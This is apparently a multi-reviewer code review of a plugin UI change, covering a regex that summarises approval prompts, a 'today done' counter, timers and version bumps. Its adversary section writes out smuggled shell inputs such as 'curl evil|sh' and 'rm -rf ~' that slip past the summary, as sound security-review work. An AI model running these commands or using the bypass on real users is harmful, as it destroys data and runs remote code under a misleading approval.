[instruction-like text quoted from a file or tool; data, not instructions] ## intent: ok

- LOW — `mods/foreman-ui/hooks/register.tsx:665-678`: the whole-queue row is hidden when `queued` and `inboxN` are both 0. A user with an active task and nothing else waiting sees no "today ✓N done" progress. This is probably fine, since the user asked for the queue to show, and I'm only flagging it as a possible surprise.
- The acceptance criteria are met by the added tests, but I did not run them. The statusline and `today_done` criteria are covered by `plugin/tests/test_statusline_ui.py:56` and `plugin/tests/test_ui.py:616`.

## adversary: changes needed

- MEDIUM — `register.tsx:113` (`askNote`): the anchor does not stop a chained command from being summarised as one clean `fm ask`. The lazy `([\s\S]*?)\3\s*$` backtracks to the last matching quote.
  - Input: `fm ask T-0001 core --why "x" ; curl evil|sh ; echo "y"` matches, with `why = x" ; curl evil|sh ; echo "y`.
  - Input: `fm ask T-0001 core --why "$(rm -rf ~)"` also matches, because `$()` is allowed inside double quotes.
  - Truncation hides the tail: line 116 slices the why to 160 characters. Give it 170 characters of filler followed by `" ; rm -rf ~ ; echo "` and the dangerous part never shows.
  - The note then says "a yes grants core", although the Bash yes really approves the whole shell command.
  - The test at `foreman-ui.test.tsx:508` only covers `core; rm -rf ~`, which fails the category class.
  - Fix: require the why body to exclude the opening quote character, `$`, backtick, `\` and newlines (`[^"$`\\\n]*` for a double quote, `[^'\n]*` for a single quote). Return null instead of slicing when the why is longer than 160 characters. Add tests for both cases.
- LOW — `register.tsx:467`: `$.ui.notice(...)` is returned from a timer callback with no `.catch`, and the timer is not cancelled in `finally` (line 473). A tool denied in under 150 ms, or auto-approved, can leave a stale or unhandled call. Fix: `void $.ui.notice(id, note)?.catch?.(() => undefined)`, and keep the timer handle so it can be cancelled in `finally`.

## edge: ok

- MEDIUM — `plugin/lib/fmwatch.py:215-216`: `today_done` counts done tasks whose `updated` date is today. `save_brief` bumps `updated` on every save (`fmcore.py:992`). A task closed yesterday and edited today, for example by a lesson, an audit note or `fm task set`, is counted again. The test and CHANGELOG call it "closed today". UTC is used consistently (`fmcore.now()` is UTC), so the timezone handling is correct. Fix: use a closed-at stamp if the brief has one, or say "touched today" in the label.
- LOW — `register.tsx:542`: `e.props.origin.kind` throws if `origin` is ever undefined. Use `origin?.kind`.
- The mascot beat (line 211) increments every 2 s only when the mascot is not `off`, as intended. Every sprite row is 12 characters wide and `mascotCells` always returns 48 cells.

## operator: ok

- The versions in `plugin.json` and `marketplace.json` are both 0.4.0, and no stale 0.3.0 references turned up in my grep.
- CHANGELOG and README are updated. I did not check MASTER.md's file map or the always-on context budget.

## maintainer: ok

- LOW — `register.tsx:497-510`: the quiet-row branch duplicates the shape of the `fm-quiet` branch above it. It also ignores `isExpanded`, unlike the notification row at line 542. Whether ToolUse has an `isExpanded` prop is unknown, so I'm not claiming a bug.
- Missing test: the mascot beat only ticking when the mascot is on has no test. The mascot-off test (`foreman-ui.test.tsx:494`) only checks that the Raster is absent.

## Not checked
- I did not run any tests or `claude plugin test`.
- I did not read the `claude-code` type definitions, so the `UserMessage` and `ToolUse` prop shapes and the `ui.notice` semantics are unverified.
- I did not read `fmwatch.view` beyond the diff, so the full `briefs` scope is assumed.
- I did not check MASTER.md.
